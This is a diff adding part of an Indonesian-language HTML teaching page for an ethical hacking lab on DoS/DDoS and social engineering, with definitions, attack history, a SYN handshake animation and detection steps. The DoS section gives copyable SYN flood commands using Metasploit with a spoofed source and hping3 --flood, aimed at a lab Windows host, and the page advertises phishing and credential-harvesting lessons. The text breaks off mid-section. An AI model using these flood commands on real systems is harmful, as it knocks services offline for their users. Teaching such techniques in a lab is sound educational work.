@@ -1,0 +1,2184 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Hacking Interactive Lab: DoS & Social Engineering</title>
+    <style>
+        :root {
+            --primary: #00f0ff;
+            --secondary: #ff2a6d;
+            --accent: #05d5fa;
+            --dark: #0a0e27;
+            --darker: #050817;
+            --light: #e0e0e0;
+            --success: #00ff9d;
+            --warning: #ffc107;
+            --card-bg: rgba(16, 22, 58, 0.8);
+            --border: rgba(0, 240, 255, 0.2);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--darker);
+            color: var(--light);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Animated background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(0, 240, 255, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255, 42, 109, 0.05) 0%, transparent 50%),
+                var(--darker);
+        }
+
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-image: 
+                linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+        }
+
+        /* Header */
+        header {
+            background: rgba(5, 8, 23, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid var(--border);
+            padding: 1rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
+        }
+
+        .logo span {
+            color: var(--secondary);
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        nav a {
+            color: var(--light);
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        nav a:hover, nav a.active {
+            border-color: var(--primary);
+            color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 4rem 0;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 2rem;
+            color: #8892b0;
+        }
+
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin-top: 2rem;
+        }
+
+        .badge {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            color: var(--primary);
+        }
+
+        /* Section Styles */
+        .section {
+            padding: 3rem 0;
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-title {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+            border-left: 4px solid var(--secondary);
+            padding-left: 1rem;
+        }
+
+        .section-subtitle {
+            color: #8892b0;
+            margin-bottom: 2rem;
+            font-size: 1.1rem;
+        }
+
+        /* Cards */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            transform: scaleX(0);
+            transition: transform 0.3s;
+        }
+
+        .card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.1);
+            border-color: var(--primary);
+        }
+
+        .card h3 {
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+            font-size: 1.3rem;
+        }
+
+        .card-icon {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Interactive Elements */
+        .interactive-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .tab-container {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--light);
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+
+        .tab-btn:hover, .tab-btn.active {
+            background: var(--primary);
+            color: var(--dark);
+            border-color: var(--primary);
+        }
+
+        .tab-content {
+            display: none;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+
+        /* Code Blocks */
+        .code-block {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 1rem;
+            margin: 1rem 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .code-block pre {
+            color: #d4d4d4;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #333;
+        }
+
+        .code-label {
+            color: var(--primary);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+        }
+
+        .copy-btn {
+            background: var(--primary);
+            color: var(--dark);
+            border: none;
+            padding: 0.25rem 0.75rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+
+        .copy-btn:hover {
+            background: var(--secondary);
+            color: white;
+        }
+
+        .copy-btn.copied {
+            background: var(--success);
+        }
+
+        /* Quiz Styles */
+        .quiz-container {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .quiz-question {
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+        }
+
+        .quiz-options {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .quiz-option {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            padding: 1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .quiz-option:hover {
+            border-color: var(--primary);
+            background: rgba(0, 240, 255, 0.05);
+        }
+
+        .quiz-option.correct {
+            border-color: var(--success);
+            background: rgba(0, 255, 157, 0.1);
+        }
+
+        .quiz-option.wrong {
+            border-color: var(--secondary);
+            background: rgba(255, 42, 109, 0.1);
+        }
+
+        .quiz-option input {
+            accent-color: var(--primary);
+        }
+
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .quiz-feedback.show {
+            display: block;
+        }
+
+        .quiz-feedback.correct {
+            background: rgba(0, 255, 157, 0.1);
+            border: 1px solid var(--success);
+            color: var(--success);
+        }
+
+        .quiz-feedback.wrong {
+            background: rgba(255, 42, 109, 0.1);
+            border: 1px solid var(--secondary);
+            color: var(--secondary);
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            margin: 2rem 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            transition: width 0.5s;
+            width: 0%;
+        }
+
+        /* Scenario Simulator */
+        .scenario-box {
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.05), rgba(255, 42, 109, 0.05));
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .scenario-text {
+            font-size: 1.1rem;
+            margin-bottom: 1.5rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-left: 3px solid var(--warning);
+        }
+
+        .scenario-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+        }
+
+        .scenario-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            color: var(--light);
+            padding: 1rem;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: all 0.3s;
+            text-align: left;
+        }
+
+        .scenario-btn:hover {
+            border-color: var(--primary);
+            background: rgba(0, 240, 255, 0.05);
+        }
+
+        .scenario-result {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .scenario-result.show {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+
+        /* Attack Vector Map */
+        .vector-map {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        .vector-category {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+        }
+
+        .vector-category h3 {
+            color: var(--primary);
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .vector-item {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border);
+            padding: 0.75rem;
+            margin: 0.5rem 0;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .vector-item:hover {
+            border-color: var(--secondary);
+            transform: translateX(5px);
+        }
+
+        .vector-item.active {
+            background: rgba(255, 42, 109, 0.1);
+            border-color: var(--secondary);
+        }
+
+        .vector-detail {
+            grid-column: 1 / -1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--secondary);
+            border-radius: 8px;
+            padding: 1.5rem;
+            display: none;
+        }
+
+        .vector-detail.show {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+
+        /* TCP Handshake Animation */
+        .handshake-container {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 2rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            margin: 2rem 0;
+            position: relative;
+            min-height: 300px;
+        }
+
+        .device {
+            text-align: center;
+            z-index: 2;
+        }
+
+        .device-icon {
+            font-size: 3rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .device-label {
+            background: var(--primary);
+            color: var(--dark);
+            padding: 0.25rem 0.75rem;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .packet-line {
+            position: absolute;
+            top: 50%;
+            left: 20%;
+            width: 60%;
+            height: 2px;
+            background: var(--border);
+            z-index: 1;
+        }
+
+        .packet {
+            position: absolute;
+            background: var(--primary);
+            color: var(--dark);
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.8rem;
+            opacity: 0;
+            transition: all 0.5s;
+        }
+
+        .packet.show {
+            opacity: 1;
+        }
+
+        .controls {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin-top: 1rem;
+        }
+
+        .btn {
+            background: var(--primary);
+            color: var(--dark);
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            background: var(--secondary);
+            color: white;
+            box-shadow: 0 0 20px rgba(255, 42, 109, 0.4);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--primary);
+            color: var(--primary);
+        }
+
+        .btn-outline:hover {
+            background: var(--primary);
+            color: var(--dark);
+        }
+
+        /* Stats Counter */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: scale(1.05);
+            border-color: var(--secondary);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: var(--secondary);
+            display: block;
+        }
+
+        .stat-label {
+            color: #8892b0;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+        }
+
+        /* Comparison Table */
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 2rem 0;
+            background: var(--card-bg);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .comparison-table th {
+            background: rgba(0, 240, 255, 0.1);
+            color: var(--primary);
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 2px solid var(--border);
+        }
+
+        .comparison-table td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .comparison-table tr:hover {
+            background: rgba(0, 240, 255, 0.02);
+        }
+
+        /* Footer */
+        footer {
+            background: rgba(5, 8, 23, 0.95);
+            border-top: 2px solid var(--border);
+            padding: 2rem 0;
+            text-align: center;
+            color: #8892b0;
+            margin-top: 3rem;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            border-bottom: 1px dashed var(--primary);
+            cursor: help;
+        }
+
+        .tooltip .tooltip-text {
+            visibility: hidden;
+            width: 250px;
+            background: var(--dark);
+            color: var(--light);
+            text-align: center;
+            border-radius: 6px;
+            padding: 0.5rem;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -125px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            border: 1px solid var(--border);
+            font-size: 0.85rem;
+        }
+
+        .tooltip:hover .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            .vector-map {
+                grid-template-columns: 1fr;
+            }
+
+            nav ul {
+                gap: 0.5rem;
+            }
+
+            .handshake-container {
+                flex-direction: column;
+                gap: 2rem;
+            }
+
+            .packet-line {
+                display: none;
+            }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--darker);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--secondary);
+        }
+
+        /* Highlight */
+        .highlight {
+            color: var(--secondary);
+            font-weight: bold;
+        }
+
+        .keyword {
+            color: var(--primary);
+            font-family: monospace;
+            background: rgba(0, 240, 255, 0.1);
+            padding: 0.1rem 0.3rem;
+            border-radius: 3px;
+        }
+    </style>
+<base target="_blank">
+</head>
+<body>
+    <div class="bg-animation"></div>
+    <div class="grid-overlay"></div>
+
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">ETHICAL<span>HACKING</span>.LAB</div>
+                <nav>
+                    <ul>
+                        <li><a href="#" class="nav-link active" data-section="home">Home</a></li>
+                        <li><a href="#" class="nav-link" data-section="dos">DoS/DDoS</a></li>
+                        <li><a href="#" class="nav-link" data-section="soceng">Social Engineering</a></li>
+                        <li><a href="#" class="nav-link" data-section="labs">Hands-On Labs</a></li>
+                        <li><a href="#" class="nav-link" data-section="quiz">Quiz & Test</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- HOME SECTION -->
+    <section id="home" class="section active">
+        <div class="container">
+            <div class="hero">
+                <h1>Ethical Hacking Interactive Lab</h1>
+                <p>Selamat datang di laboratorium ethical hacking interaktif. Pelajari teknik <span class="highlight">Denial of Service (DoS/DDoS)</span> dan <span class="highlight">Social Engineering</span> melalui simulasi hands-on, scenario-based learning, dan quiz interaktif. Materi ini disusun berdasarkan kurikulum Telkom University.</p>
+
+                <div class="badge-container">
+                    <div class="badge">DoS Attack</div>
+                    <div class="badge">DDoS Attack</div>
+                    <div class="badge">SYN Flooding</div>
+                    <div class="badge">Phishing</div>
+                    <div class="badge">Payload Crafting</div>
+                    <div class="badge">Credential Harvesting</div>
+                </div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="stat-number" data-target="95">0</span>
+                    <div class="stat-label">% Breaches Caused by Human Error</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number" data-target="300">0</span>
+                    <div class="stat-label">% Increase in Data Breaches (Post-COVID)</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number" data-target="667">0</span>
+                    <div class="stat-label">% Increase in Phishing (March 2020)</div>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number" data-target="90">0</span>
+                    <div class="stat-label">% Increase in Ransomware</div>
+                </div>
+            </div>
+
+            <div class="card-grid">
+                <div class="card">
+                    <div class="card-icon">🛡️</div>
+                    <h3>Denial of Service (DoS)</h3>
+                    <p>Pelajari cara kerja serangan DoS dan DDoS, mulai dari SYN Flooding, Ping of Death, hingga teknik deteksi menggunakan sensor network. Simulasi three-way handshake interaktif tersedia.</p>
+                </div>
+                <div class="card">
+                    <div class="card-icon">🎭</div>
+                    <h3>Social Engineering</h3>
+                    <p>Kuasai teknik manipulasi psikologis: phishing, pretexting, baiting, dan credential harvesting. Pelajari cara membuat payload dan fake website clone.</p>
+                </div>
+                <div class="card">
+                    <div class="card-icon">⚡</div>
+                    <h3>Hands-On Labs</h3>
+                    <p>Praktik langsung dengan command generator, scenario simulator, dan attack vector explorer. Semua tools siap pakai dalam lingkungan virtual.</p>
+                </div>
+            </div>
+
+            <div class="interactive-box">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">🎯 Learning Path</h3>
+                <div class="progress-container">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                        <span>Progress Anda</span>
+                        <span id="progress-text">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress-fill"></div>
+                    </div>
+                </div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-top: 1rem;">
+                    <div class="card" style="cursor: pointer;" onclick="showSection('dos')">
+                        <h4>1. DoS/DDoS Fundamentals</h4>
+                        <p style="font-size: 0.9rem; color: #8892b0;">Buffer overflow, flood attacks, sejarah serangan</p>
+                    </div>
+                    <div class="card" style="cursor: pointer;" onclick="showSection('dos')">
+                        <h4>2. SYN Flooding Lab</h4>
+                        <p style="font-size: 0.9rem; color: #8892b0;">nmap, msfconsole, hping3, wireshark</p>
+                    </div>
+                    <div class="card" style="cursor: pointer;" onclick="showSection('soceng')">
+                        <h4>3. Social Engineering Vectors</h4>
+                        <p style="font-size: 0.9rem; color: #8892b0;">Technical & non-technical attack vectors</p>
+                    </div>
+                    <div class="card" style="cursor: pointer;" onclick="showSection('soceng')">
+                        <h4>4. Payload & Phishing</h4>
+                        <p style="font-size: 0.9rem; color: #8892b0;">msfvenom, SET toolkit, credential harvester</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- DOS SECTION -->
+    <section id="dos" class="section">
+        <div class="container">
+            <h2 class="section-title">Denial of Service (DoS & DDoS)</h2>
+            <p class="section-subtitle">Memahami serangan yang bertujuan membuat resource mesin atau network tidak tersedia bagi pengguna yang berhak.</p>
+
+            <div class="tab-container">
+                <button class="tab-btn active" onclick="openTab(event, 'dos-def')">Definisi</button>
+                <button class="tab-btn" onclick="openTab(event, 'dos-cat')">Kategori</button>
+                <button class="tab-btn" onclick="openTab(event, 'dos-hist')">Sejarah</button>
+                <button class="tab-btn" onclick="openTab(event, 'dos-syn')">SYN Flooding</button>
+                <button class="tab-btn" onclick="openTab(event, 'dos-detect')">Deteksi</button>
+            </div>
+
+            <div id="dos-def" class="tab-content active">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Apa itu Denial of Service?</h3>
+                <p>Denial-of-Service (DoS) attack adalah serangan siber di mana pelaku berusaha membuat mesin atau resource network <span class="highlight">tidak tersedia</span> bagi pengguna yang dituju dengan cara mengganggu layanan host yang terhubung ke Internet secara temporary atau indefinite.</p>
+
+                <div class="card-grid" style="margin-top: 2rem;">
+                    <div class="card">
+                        <h3>DoS (Single Source)</h3>
+                        <p>Menggunakan <span class="highlight">satu koneksi/sumber</span> untuk melakukan flood request ke target. Biasanya memerlukan bandwidth yang lebih besar dari target.</p>
+                    </div>
+                    <div class="card">
+                        <h3>DDoS (Distributed)</h3>
+                        <p>Traffic flood berasal dari <span class="highlight">banyak sumber berbeda</span> (botnet). Membuatnya mustahil untuk menghentikan serangan hanya dengan memblokir satu sumber.</p>
+                    </div>
+                </div>
+
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Aspek</th>
+                            <th>DoS</th>
+                            <th>DDoS</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Sumber Serangan</td>
+                            <td>Single source / satu koneksi</td>
+                            <td>Multiple sources / botnet</td>
+                        </tr>
+                        <tr>
+                            <td>Skalabilitas</td>
+                            <td>Terbatas oleh bandwidth attacker</td>
+                            <td>Massive, distributed globally</td>
+                        </tr>
+                        <tr>
+                            <td>Mitigasi</td>
+                            <td>Block single IP address</td>
+                            <td>Requires advanced filtering & CDN</td>
+                        </tr>
+                        <tr>
+                            <td>Kompleksitas</td>
+                            <td>Relatif sederhana</td>
+                            <td>Memerlukan koordinasi banyak node</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div id="dos-cat" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Kategori Serangan DoS</h3>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <div class="card-icon">💥</div>
+                        <h3>Buffer Overflow Attacks</h3>
+                        <p>Memory buffer overflow menyebabkan mesin mengonsumsi seluruh hard disk space, memory, atau CPU time. Hasilnya: <span class="highlight">system sluggish, crash, atau deleterious server behavior</span>.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon">🌊</div>
+                        <h3>Flood Attacks</h3>
+                        <p>Mensaturasi target server dengan <span class="highlight">jumlah packet yang overwhelming</span>. Attacker harus memiliki bandwidth yang lebih besar dari target untuk keberhasilan.</p>
+                    </div>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--secondary); margin-bottom: 1rem;">⚠️ Catatan Penting</h4>
+                    <p>Historically, DoS attacks mengeksploitasi security vulnerabilities dalam network, software, dan hardware design. Namun kini <span class="highlight">DDoS attacks lebih prevalent</span> karena memiliki disruptive capability yang lebih besar dan relatif mudah dibuat dengan tools yang tersedia.</p>
+                    <p style="margin-top: 1rem;">Realitasnya: <span class="highlight">sebagian besar DoS attacks dapat diubah menjadi DDoS attacks</span>.</p>
+                </div>
+            </div>
+
+            <div id="dos-hist" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Sejarah Serangan DoS</h3>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <h3>Smurf Attack</h3>
+                        <p>Malicious actor menggunakan <span class="highlight">broadcast address</span> dari network yang vulnerable dengan mengirim spoofed packets, mengakibatkan flooding pada IP target.</p>
+                    </div>
+                    <div class="card">
+                        <h3>Ping Flood</h3>
+                        <p>Serangan sederhana berbasis <span class="highlight">ICMP (ping) packets</span>. Target dibanjiri dengan ping lebih banyak dari yang mampu di-respon, mengakibatkan denial-of-service. Dapat juga digunakan sebagai DDoS.</p>
+                    </div>
+                    <div class="card">
+                        <h3>Ping of Death</h3>
+                        <p>Mengirimkan <span class="highlight">malformed packet</span> ke mesin target, mengakibatkan system crash dan deleterious behavior. Sering disalahartikan dengan ping flood.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="dos-syn" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Demo: SYN Flooding Attack</h3>
+                <p>SYN Flooding mengeksploitasi <span class="highlight">TCP Three-Way Handshake</span> dengan mengirimkan SYN packets tanpa menyelesaikan handshake, mengonsumsi resource server.</p>
+
+                <div class="handshake-container" id="handshake-visual">
+                    <div class="device">
+                        <div class="device-icon">💻</div>
+                        <div class="device-label">ATTACKER</div>
+                    </div>
+                    <div class="device">
+                        <div class="device-icon">🖥️</div>
+                        <div class="device-label">TARGET SERVER</div>
+                    </div>
+                    <div class="packet-line"></div>
+                    <div class="packet" id="packet-syn" style="top: 40%; left: 25%;">SYN</div>
+                    <div class="packet" id="packet-synack" style="top: 50%; left: 55%;">SYN-ACK</div>
+                    <div class="packet" id="packet-ack" style="top: 60%; left: 25%;">ACK</div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn" onclick="animateHandshake()">▶ Jalankan Handshake Normal</button>
+                    <button class="btn btn-outline" onclick="animateSynFlood()">⚡ Simulasikan SYN Flood</button>
+                    <button class="btn btn-outline" onclick="resetHandshake()">↺ Reset</button>
+                </div>
+
+                <div id="handshake-status" style="text-align: center; margin-top: 1rem; color: var(--primary); min-height: 1.5rem;"></div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">Reconnaissance - Port Scanning</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre>nmap -p- [Windows IP Address]</pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">Metasploit SYN Flood</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre>msfconsole
+use auxiliary/dos/tcp/synflood
+set RHOST [IP Target Windows]
+set RPORT 445
+set SHOST [IP Windows Host]  # Spoofing
+run</pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-label">Hping3 SYN Flood</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre>hping3 -S [Windows TARGET IP] -a [Kali IP] -p 22 --flood</pre>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--warning); margin-bottom: 1rem;">🔍 Verification Steps</h4>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="padding: 0.5rem 0;">☐ Buka <strong>Wireshark</strong> - filter TCP packets dengan flag [SYN]</li>
+                        <li style="padding: 0.5rem 0;">☐ Periksa <strong>Task Manager</strong> - CPU dan Network usage akan spike</li>
+                        <li style="padding: 0.5rem 0;">☐ Periksa <strong>Resource Monitor</strong> - port 445 dalam status SYN_RECEIVED</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div id="dos-detect" class="tab-content">
+                <h3 style="color: var(--primary); margin-bottom: 1rem;">Deteksi Serangan DoS</h3>
+                <p>Untuk mendeteksi traffic DoS, kita dapat menggunakan <span class="highlight">KFSensor</span> sebagai network sensor yang memonitor anomali traffic.</p>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <h3>1. Download KFSensor</h3>
+                        <p>Kunjungi <span class="keyword">kfsensor.net</span> dan download versi Free Trial. Software ini berfungsi sebagai <span class="highlight">IDS (Intrusion Detection System)</span> berbasis Windows.</p>
+                    </div>
+                    <div class="card">
+                        <h3>2. Install WinPcap/Npcap</h3>
+                        <p>KFSensor memerlukan packet capture library. Install <span class="keyword">WinPcap 4.1.3</span> atau <span class="keyword">Npcap</span> untuk Windows modern.</p>
+                    </div>
+                    <div class="card">
+                        <h3>3. Konfigurasi Permission</h3>
+                        <p>Ubah ownership file ke <span class="highlight">Administrators</span> dan jalankan dengan privilege "Run as administrator". Pastikan UAC diset ke level yang sesuai.</p>
+                    </div>
+                    <div class="card">
+                        <h3>4. Monitor Traffic</h3>
+                        <p>KFSensor akan menampilkan log connections, termasuk UDP, TCP, DNS, DHCP, dan FTP. Perhatikan <span class="highlight">spike anomali</span> pada durasi dan jumlah connections.</p>
+                    </div>
+                </div>
+
+                <div class="interactive-box">
+                    <h4 style="color: var(--secondary); margin-bottom: 1rem;">🚨 Indikator Serangan DoS pada KFSensor</h4>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
+                        <div style="background: rgba(255, 42, 109, 0.1); border: 1px solid var(--secondary); padding: 1rem; border-radius: 6px;">
+                            <strong style="color: var(--secondary);">Traffic Spike</strong><br>
